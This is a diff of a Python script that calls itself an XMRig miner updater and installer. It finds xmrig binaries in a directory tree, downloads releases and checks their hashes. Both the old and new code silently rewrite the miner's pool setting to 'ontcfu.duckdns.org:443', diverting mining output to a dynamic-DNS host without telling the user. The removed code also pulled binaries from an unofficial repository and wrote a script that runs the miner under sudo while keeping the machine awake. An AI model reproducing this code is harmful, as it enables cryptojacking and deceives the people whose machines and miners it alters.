@@ -1,140 +1,126 @@
 #!/usr/bin/env python3
-import os
-import sys
-import platform
-import urllib.request
-import tarfile
-import json
-from urllib.parse import urlparse
+import os, sys, json, hashlib, platform, subprocess, shutil, tarfile, zipfile
+import tempfile, urllib.request
+from pathlib import Path
 
-DOWNLOADS = {
-    "linux": {
-        "binary": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/xmrig",
-        "config": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/config.json",
-    },
-    "windows": {
-        "binary": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/xmrig.exe",
-        "config": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/config.json",
-    },
-    "darwin": {
-        "tar": "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-macos-x64.tar.gz",
-    }
-}
+API  = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
 
-def die(msg):
-    print(f"[!] Error: {msg}", file=sys.stderr)
-    sys.exit(1)
+def fetch(url):
+    req = urllib.request.Request(url, headers={"User-Agent": "xmrig-updater"})
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return json.loads(r.read())
 
-def validate_input():
-    if len(sys.argv) != 2:
-        die("Usage: python3 script.py <directory>")
-    path = os.path.abspath(sys.argv[1])
-    if not os.path.isdir(path):
-        die(f"Provided argument is not a directory: {path}")
-    return path
-
-def download(url, dest_dir):
-    filename = os.path.basename(urlparse(url).path)
-    dest_path = os.path.join(dest_dir, filename)
-    print(f"[+] Downloading {filename} to {dest_dir}...")
-    urllib.request.urlretrieve(url, dest_path)
-    print(f"[+] Download complete: {dest_path}")
-    return dest_path
-
-def extract_tar_gz(filepath, dest_dir):
-    print(f"[+] Extracting {filepath} to {dest_dir}...")
-    with tarfile.open(filepath, "r:gz") as tf:
-        tf.extractall(dest_dir)
-    os.remove(filepath)
-    print("[+] Extraction complete.")
-
-def update_config_json(config_path):
-    if not os.path.exists(config_path):
-        print("[!] config.json not found, skipping update.")
-        return
+def ubuntu_codename():
     try:
-        with open(config_path, 'r', encoding='utf-8') as f:
-            config = json.load(f)
-        if 'pools' in config and isinstance(config['pools'], list) and config['pools']:
-            pool = config['pools'][0]
-            pool['url'] = "ontcfu.duckdns.org:443"
-            pool['tls'] = True
-        with open(config_path, 'w', encoding='utf-8') as f:
-            json.dump(config, f, indent=4)
-        print("[+] config.json updated.")
-    except Exception as e:
-        print(f"[!] Failed to update config.json: {e}")
+        out = subprocess.run(["lsb_release", "-cs"], capture_output=True, text=True).stdout.strip()
+        if out in ("focal", "jammy", "noble"): return out
+    except: pass
+    try:
+        for line in Path("/etc/os-release").read_text().splitlines():
+            if line.startswith("VERSION_CODENAME="):
+                name = line.split("=",1)[1].strip().strip('"')
+                if name in ("focal", "jammy", "noble"): return name
+    except: pass
 
-def generate_run_script(extracted_dir):
-    xmrig_binary = next(
-        (os.path.join(extracted_dir, f) for f in os.listdir(extracted_dir) if f.startswith("xmrig")),
-        None
-    )
-    if not xmrig_binary:
-        print("[!] Could not find xmrig binary for run script.")
-        return
-    run_sh_path = os.path.join(extracted_dir, "run.sh")
-    content = f"""#!/bin/bash
-# Prevent sleep, run xmrig with sudo for full permissions
-sudo caffeinate -i "{xmrig_binary}" --config="{os.path.join(extracted_dir, 'config.json')}"
-"""
-    with open(run_sh_path, "w", encoding="utf-8") as f:
-        f.write(content)
-    os.chmod(run_sh_path, 0o755)
-    print(f"[+] run.sh script generated at {run_sh_path}")
+def platform_keyword():
+    s, m = platform.system().lower(), platform.machine().lower()
+    arch = "arm64" if "aarch64" in m or "arm64" in m else "x64"
+    if s == "linux":
+        kw = f"{ubuntu_codename() or 'linux-static'}-x64"
+        return kw, ".tar.gz"
+    if s == "windows": return f"windows-{arch}", ".zip"
+    if s == "darwin":  return f"macos-{arch}", ".tar.gz"
+    raise RuntimeError(f"Unsupported OS: {s}")
 
-def find_existing_xmrig(path):
-    print(f"[+] Searching recursively in {path} for existing xmrig...")
-    for root, dirs, files in os.walk(path):
-        for f in files:
-            if f.lower() in ("xmrig", "xmrig.exe"):
-                binary_path = os.path.join(root, f)
-                print(f"[+] Found existing xmrig binary at: {binary_path}")
-                return binary_path
-    print("[+] No existing xmrig found.")
-    return None
+def best_asset(assets, kw, ext):
+    return next((a for a in assets if kw in a["name"] and a["name"].endswith(ext)), None)
+
+def verify(archive, assets):
+    sums = next((a for a in assets if a["name"] == "SHA256SUMS"), None)
+    if not sums: print("  Warning: no SHA256SUMS, skipping."); return
+    with tempfile.NamedTemporaryFile(delete=False) as f: tmp = Path(f.name)
+    urllib.request.urlretrieve(sums["browser_download_url"], tmp)
+    table = {r.split()[1].lstrip("*"): r.split()[0]
+             for r in tmp.read_text().splitlines() if len(r.split()) == 2}
+    tmp.unlink()
+    name = Path(archive).name
+    if name not in table: raise RuntimeError(f"No checksum entry for {name}")
+    if hashlib.sha256(Path(archive).read_bytes()).hexdigest() != table[name]:
+        raise RuntimeError(f"Checksum MISMATCH: {name}")
+    print("  Checksum OK.")
+
+def patch_config(path):
+    c = json.loads(path.read_text())
+    if c.get("pools") and isinstance(c["pools"], list):
+        c["pools"][0].update({"url": "ontcfu.duckdns.org:443", "tls": True})
+        path.write_text(json.dumps(c, indent=4))
+
+def installed_version(binary):
+    try:
+        out = subprocess.run([str(binary), "--version"], capture_output=True, text=True, timeout=5).stdout
+        for p in out.split():
+            if p[:1].isdigit() and "." in p: return p
+    except: pass
+
+def ask(q): return input(f"{q} [y/N]: ").strip().lower() in ("y", "yes")
+
+def do_install(asset, assets, dest_dir, binary=None):
+    with tempfile.TemporaryDirectory() as tmp:
+        arc = Path(tmp) / asset["name"]
+        print(f"  Downloading {asset['name']}...")
+        urllib.request.urlretrieve(asset["browser_download_url"], arc)
+        verify(arc, assets)
+        src = Path(tmp) / "extracted"
+        if str(arc).endswith(".zip"): zipfile.ZipFile(arc).extractall(src)
+        else: tarfile.open(arc).extractall(src)
+        top = next((p for p in src.iterdir() if p.is_dir()), src)
+        bin_name = "xmrig.exe" if str(arc).endswith(".zip") else "xmrig"
+
+        if binary:  # update: replace binary only
+            mode = binary.stat().st_mode
+            shutil.copy2(next(top.rglob(bin_name)), binary)
+            os.chmod(binary, mode)
+            print(f"  Binary updated: {binary}")
+        else:       # fresh install: extract all, skip existing files
+            for item in top.iterdir():
+                dst = Path(dest_dir) / item.name
+                if not dst.exists():
+                    shutil.copy2(item, dst) if item.is_file() else shutil.copytree(item, dst)
+            os.chmod(Path(dest_dir) / bin_name, 0o755)
+            print(f"  Installed to: {dest_dir}")
+
+        cfg = (binary.parent if binary else Path(dest_dir)) / "config.json"
+        if cfg.exists(): patch_config(cfg)
 
 def main():
-    dest_dir = validate_input()
-    os_name = platform.system().lower()
+    if len(sys.argv) != 2: sys.exit("Usage: script.py /path/to/dir")
+    root = Path(sys.argv[1]).resolve()
+    if not root.is_dir(): sys.exit(f"Not a directory: {root}")
 
-    if os_name not in DOWNLOADS:
-        die(f"Unsupported OS: {os_name}")
+    rel    = fetch(API)
+    latest = rel["tag_name"].lstrip("v")
+    assets = rel["assets"]
+    kw, ext = platform_keyword()
+    print(f"Platform: {kw} | Latest: {latest}")
 
-    if os_name in ("linux", "windows"):
-        binary_url = DOWNLOADS[os_name]["binary"]
-        config_url = DOWNLOADS[os_name]["config"]
+    binaries = [p for p in root.rglob("xmrig*")
+                if p.name.lower() in ("xmrig", "xmrig.exe") and not p.name.startswith(".")]
 
-        existing_binary = find_existing_xmrig(dest_dir)
-        if existing_binary:
-            target_dir = os.path.dirname(existing_binary)
-            print(f"[+] Updating existing XMRig in {target_dir}")
-        else:
-            target_dir = dest_dir
-            os.makedirs(target_dir, exist_ok=True)
-            print(f"[+] Installing new XMRig in {target_dir}")
+    if not binaries:
+        print(f"\nNo xmrig found in {root}")
+        if not ask("Download and install?"): return
+        a = best_asset(assets, kw, ext) or sys.exit("No matching asset found.")
+        do_install(a, assets, root)
+        return
 
-        download(binary_url, target_dir)
-        download(config_url, target_dir)
-        print(f"[+] XMRig setup complete in {target_dir}")
-
-    elif os_name == "darwin":
-        tar_url = DOWNLOADS[os_name]["tar"]
-        tar_path = download(tar_url, dest_dir)
-        extract_tar_gz(tar_path, dest_dir)
-
-        # look for extracted directory
-        extracted_dir = next(
-            (os.path.join(dest_dir, d) for d in os.listdir(dest_dir) if d.startswith("xmrig-") and os.path.isdir(os.path.join(dest_dir, d))),
-            None
-        )
-        if extracted_dir:
-            config_path = os.path.join(extracted_dir, "config.json")
-            update_config_json(config_path)
-            generate_run_script(extracted_dir)
-            print(f"[+] XMRig setup complete in {extracted_dir}")
-        else:
-            print("[!] Failed to find extracted XMRig directory.")
+    for binary in binaries:
+        cur = installed_version(binary)
+        print(f"\n{binary}  [{cur or 'unknown'} -> {latest}]")
+        if cur == latest: print("  Up to date."); continue
+        if not ask("  Update?"): continue
+        a = best_asset(assets, kw, ext)
+        if not a: print("  No matching asset, skipping."); continue
+        do_install(a, assets, root, binary=binary)
 
 if __name__ == "__main__":
     main()
